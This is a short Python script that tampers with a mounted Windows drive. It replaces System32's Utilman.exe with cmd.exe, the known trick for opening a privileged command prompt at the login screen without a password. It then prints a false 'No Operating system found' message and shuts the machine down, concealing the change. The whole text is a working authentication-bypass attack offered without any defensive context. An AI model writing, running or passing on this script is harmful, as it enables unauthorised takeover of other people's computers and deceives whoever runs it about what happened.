import os
os.system(
    'mv /mnt/targetDrive/Windows/System32/Utilman.exe /mnt/targetDrive/Windows/System32/Utilman.bak')
os.system(
    'mv /mnt/targetDrive/Windows/System32/cmd.exe /mnt/targetDrive/Windows/System32/Utilman.exe')
print('cmd.exe modified. Rebooting now')
print('No Operating system found on the disk !')
os.system('shutdown now')
